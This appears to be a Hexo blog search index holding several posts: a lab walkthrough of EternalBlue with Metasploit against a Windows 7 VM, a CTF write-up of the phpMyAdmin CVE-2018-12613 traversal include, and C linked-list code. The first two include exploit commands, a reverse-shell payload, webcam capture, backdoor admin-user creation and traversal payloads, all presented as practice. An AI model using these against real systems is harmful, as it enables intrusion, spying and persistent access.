<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>MSF-永恒之蓝入侵</title>
    <url>/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/</url>
    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
<h3 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h3><p>渗透机kali      ip:192.168.119.138</p>
<p>靶机 win7-2    ip:192.168.119.132</p>
<p>子网掩码：255.255.255.0</p>
<span id="more"></span>

<h3 id="测试能否ping通"><a href="#测试能否ping通" class="headerlink" title="测试能否ping通"></a>测试能否ping通</h3><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193858120.png" alt="image-20200926193858120">

<p>​       </p>
<img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193926874.png" alt="image-20200926193926874">

<p>ok 可以</p>
<hr>
<ul>
<li>kali打开 msfconsole</li>
</ul>
<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926194608129.png" alt="image-20200926194608129"></p>
<ul>
<li>输入search ms17_010</li>
</ul>
<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926195212894.png" alt="image-20200926195212894"></p>
<p><code>auxiliary/scanner/smb/smb_ms17_010</code>             为扫描模板</p>
<p><code>exploit/windows/smb/ms17_010_eternalblue</code>为攻击模板</p>
<h3 id="扫描是否存在该漏洞"><a href="#扫描是否存在该漏洞" class="headerlink" title="扫描是否存在该漏洞"></a>扫描是否存在该漏洞</h3><blockquote>
<p>ues <code>auxiliary/scanner/smb/smb_ms17_010</code>    #使用模块</p>
<p>optipons                                                                         #查看我们需要的设置</p>
<p>set rhosts   192.168.119.1-137                                       #设置目标ip范围</p>
<p>set threads     20                                                             #设置线程，加快扫描</p>
<p>run</p>
</blockquote>
<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926201345760.png" alt="image-20200926201345760"></p>
<p>我们可以发现存在漏洞的地方</p>
<hr>
<h3 id="运用攻击模块"><a href="#运用攻击模块" class="headerlink" title="运用攻击模块"></a>运用攻击模块</h3><blockquote>
<p>use   <code>exploit/windows/smb/ms17_010_eternalblue</code></p>
<p>set rhosts  192.168.119.132</p>
<p>set payload windows/x64/meterpreter/reverse_tcp</p>
<p>set lhost 192.168.119.138</p>
<p>exploit</p>
</blockquote>
<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205215563.png" alt="image-20200926205215563"></p>
<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205307084.png" alt="image-20200926205307084"></p>
<p>成功监听了。</p>
<hr>
<h3 id="干点坏事了-嘿嘿"><a href="#干点坏事了-嘿嘿" class="headerlink" title="干点坏事了~_ ~嘿嘿"></a>干点坏事了~_ ~嘿嘿</h3><blockquote>
<p>sysinfo   显示远程主机系统信息</p>
<p>getuid    查看用户身份</p>
<p>screenshot  对远程主机当前屏幕进行截图</p>
</blockquote>
<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926210803367.png" alt="image-20200926210803367"></p>
<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926211000376.png" alt="image-20200926211000376"></p>
<blockquote>
<p>webcam_list 查看有没有摄像头  ,webcam_stream 打开摄像头。虚拟机一般情况下没有摄像头，除非自己设置</p>
<p>webcam_snap 拍照</p>
</blockquote>
<blockquote>
<p>shell  进入控制台    如果出现中文乱码  : chcp 65001解决shell后中文乱码问题</p>
<p>后面删文件（del   ），写文件(echo  内容&gt; 1.txt)都可以 //dos 命令</p>
</blockquote>
<hr>
<h3 id="留后门"><a href="#留后门" class="headerlink" title="留后门"></a>留后门</h3><blockquote>
<p>net user shmily-ing 111111 /add  创建shmily-ing用户</p>
<p> net localgroup administrators shmily-ing /add   提权</p>
</blockquote>
<hr>
<p><a href="https://blog.csdn.net/qq_27446553/article/details/73480807?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase"><strong>EternalBlue-分析</strong></a></p>
<p><a href="https://blog.csdn.net/wwl012345/article/details/89421881">参考博客</a></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>MSF</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU- [GWCTF 2019]</title>
    <url>/2020/09/27/2020-9-27buuctf/</url>
    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
<blockquote>
<p>phpmyadmin (CVE-2018-12613)任意文件包含漏洞。影响版本4.8.0–4.8.1</p>
<span id="more"></span>
</blockquote>
<h3 id="打开网页，神马也不是。"><a href="#打开网页，神马也不是。" class="headerlink" title="打开网页，神马也不是。"></a>打开网页，神马也不是。</h3><p><img src="/2020/09/27/2020-9-27buuctf/image-20200925180115693.png" alt="image-20200925180115693"></p>
<h3 id="F12没有信息，直接扫网站后台"><a href="#F12没有信息，直接扫网站后台" class="headerlink" title="F12没有信息，直接扫网站后台"></a>F12没有信息，直接扫网站后台</h3><blockquote>
<p>python dirsearch.py -u <a href="http://10b9238b-d123-4f63-891c-33ce01e55ca1.node3.buuoj.cn/">http://10b9238b-d123-4f63-891c-33ce01e55ca1.node3.buuoj.cn/</a> -e *  -s  0.05</p>
</blockquote>
<p> 刚开始没有扫出来，全是429，可能太快了，  就在后面加了个 -s  延迟一下</p>
<p><img src="/2020/09/27/2020-9-27buuctf/image-20200925230015691.png" alt="image-20200925230015691"></p>
<p>发现phpmyadmin ,phpinfo.php(没信息)</p>
<p>直接进入数据库。查看版本4.8.1</p>
<p>然后就百度该版本漏洞，发现有 任意文件包含和任意代码执行漏洞</p>
<p><a href="https://xz.aliyun.com/t/6592">CVE-2018-12613 phpMyAdmin远程文件包含漏洞</a></p>
<p>传入<code>?target=db_datadict.php%253f</code>，<code>%253f</code>开始服务器自动解码一次为<code>%3f</code>，然后<code>urldecode</code>函数再解码一次为<code>?</code>，则满足截取?之前的内容在白名单中，返回<code>true</code>。而在<code>index.php</code>中只解码一次为<code>db_datadict.php%3f</code></p>
<h3 id="目录穿越，任意文件包含pyload："><a href="#目录穿越，任意文件包含pyload：" class="headerlink" title="目录穿越，任意文件包含pyload："></a>目录穿越，任意文件包含pyload：</h3><blockquote>
<p>?target=db_sql.php%253f/../../../../../../../../flag</p>
</blockquote>
<p><img src="/2020/09/27/2020-9-27buuctf/image-20200926122420288.png" alt="image-20200926122420288"></p>
<ul>
<li>session 进行 php 代码执行（session 文件中中记录了执行的操作）</li>
</ul>
<p>​        具体方法：SELECT ‘ <code>&lt;?php phpinfo()?&gt;</code> ‘ ;</p>
<p><img src="/2020/09/27/2020-9-27buuctf/image-20200926120643739.png" alt="image-20200926120643739"></p>
<p>然后查看session值,</p>
<blockquote>
<p>?target=db_sql.php%253f/../../../../../../../../tmp/sess_fal9idhffq4t112qfa86k5kbo1</p>
</blockquote>
<p>可以搜索flag。(没成功)</p>
<ul>
<li>网上说写入后门（本题好像不太行，因为没有写入权限），本地搭建的话可以实现。</li>
</ul>
<p><img src="/2020/09/27/2020-9-27buuctf/image-20200926122045439.png" alt="image-20200926122045439"></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF/jxV/9/cEb5pShRgewJe/ttJn2gIlIyGF/bsgGmzcbsV+LmMK#rd">后台gertshell</a></p>
<p><a href="https://www.cnblogs.com/wangyuyang1016/p/12014016.html">参考博客</a></p>
<hr>
<h3 id="漏洞代码分析"><a href="#漏洞代码分析" class="headerlink" title="漏洞代码分析"></a>漏洞代码分析</h3><p>​            target 出事了,   满足if判断    即可促发include</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// If we have a valid target, let&#x27;s load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    ! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])  <span class="comment">//不为空</span></span><br><span class="line">    &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])   <span class="comment">//是字符串</span></span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])  <span class="comment">//不以index开头</span></span><br><span class="line">    &amp;&amp; ! in_array(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)  <span class="comment">//不在$target_blacklist中</span></span><br><span class="line">    &amp;&amp; Core::checkPageValidity(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])  <span class="comment">//要返回真</span></span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>​           $target_blacklist，target参数黑名单  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$target_blacklist</span> = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);    <span class="comment">//解码，</span></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>$whitelist一开始未传参过来，所以会被赋值为self::$goto_whitelist</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>如果$page在白名单中就会直接return true，但这里考虑到了可能带参数的情况</p>
<blockquote>
<p>  <strong>mb_substr</strong>    ( string <code>$str</code>   , int <code>$start</code>   [, int <code>$length</code> = NULL   [, string <code>$encoding</code> = mb_internal_encoding()  ]] ) : string</p>
</blockquote>
<p>   根据字符数执行一个多字节安全的 <a href="https://www.php.net/manual/zh/function.substr.php">substr()</a> 操作。   位置是从 <code>str</code> 的开始位置进行计数。   第一个字符的位置是 0。第二个字符的位置是 1，以此类推。   </p>
<p>$_page是取出$page问号前的东西，是考虑到target有参数的情况，只要$_page在白名单中就直接return true<br> 但还考虑了url编码的情况，所以如果这步判断未成功，下一步又进行url解码.</p>
<p>所以传入二次编码后的内容，会让checkPageValidity()这个函数返回true，但index中实际包含的内容却不是白名单中的文件</p>
<p>例如传入<br> <code>?target=db_datadict.php%253f</code><br> 由于服务器会自动解码一次，所以在checkPageValidity()中，$page的值一开始会是<code>db_datadict.php%3f</code>，又一次url解码后变成了<code>db_datadict.php?</code>，这次便符合了?前内容在白名单的要求，函数返回true<br> 但在index.php中$_REQUEST[‘target’]仍然是<code>db_datadict.php%3f</code>，而且会被include，通过目录穿越，就可造成任意文件包含</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>链表-c语言</title>
    <url>/2020/09/16/2020.9.16%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
<p>下面主要是运用C去实现链表的头插法，尾插法实现有序插入，以及中间插入一个数。</p>
<span id="more"></span>

<h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span><span class="comment">// 头插法</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">list</span> *p;</span><br><span class="line">	head=<span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	input();</span><br><span class="line">	<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123; <span class="comment">//输出头插法链表数据</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	</span><br><span class="line">	head = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		s=(<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">		s-&gt;data=i;</span><br><span class="line">		s-&gt;next = head;  <span class="comment">//第一个数据地址为空，下一个指向前一个s；</span></span><br><span class="line">		head = s;          <span class="comment">//作为新头部；</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="尾插法的有序插入"><a href="#尾插法的有序插入" class="headerlink" title="尾插法的有序插入"></a>尾插法的有序插入</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">         <span class="keyword">char</span> data;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linklist;</span><br><span class="line">  linklist *head,*tail;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   linklist *p;</span><br><span class="line">   head=tail=<span class="literal">NULL</span>;</span><br><span class="line">   input();</span><br><span class="line">   <span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,p-&gt;data);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> ch;</span><br><span class="line">   linklist *t;</span><br><span class="line">   ch=getchar();</span><br><span class="line">   <span class="keyword">while</span>(ch!=&amp;apos;@&amp;apos;)&#123;</span><br><span class="line">       t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">       t-&gt;data=ch;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">       head=t;</span><br><span class="line">       t-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">       tail-&gt;next=t;</span><br><span class="line">&#125;</span><br><span class="line">   tail=t;</span><br><span class="line">   tail-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">   t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">   ch=getchar();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h3 id="插入有序链表一个数"><a href="#插入有序链表一个数" class="headerlink" title="插入有序链表一个数"></a>插入有序链表一个数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>     <span class="comment">//实现简单的有序链表插入 </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*tail;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *p; </span><br><span class="line">	head=tail=<span class="literal">NULL</span>;</span><br><span class="line">	input_inset();</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;     </span><br><span class="line">	</span><br><span class="line">	          <span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);         </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,num;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *t,*T,*pp;</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		t-&gt;data = i;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;  </span><br><span class="line">	</span><br><span class="line">		    head = t;     </span><br><span class="line">		    t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> tail-&gt;next=t;</span><br><span class="line">	</span><br><span class="line">	tail = t;   </span><br><span class="line">	</span><br><span class="line">	tail-&gt;next=<span class="literal">NULL</span>;  </span><br><span class="line">	</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//插入操作 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入插入点的前一个数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(pp=head;pp!=<span class="literal">NULL</span>;pp= pp-&gt;next)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(pp-&gt;data==num)&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">			T = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T-&gt;data);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			T-&gt;next=pp-&gt;next;</span><br><span class="line">			</span><br><span class="line">			pp-&gt;next = T;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输出插入后的链表\n&quot;</span>);	</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>多谢刘**的指导（内心抗拒）</p>
<p>可能写的不是很完美，感谢大佬的访问~~ORZ</p>
]]></content>
      <categories>
        <category>C语言</category>
      </categories>
      <tags>
        <tag>算法与数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>2020总结</title>
    <url>/2021/02/06/2020%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
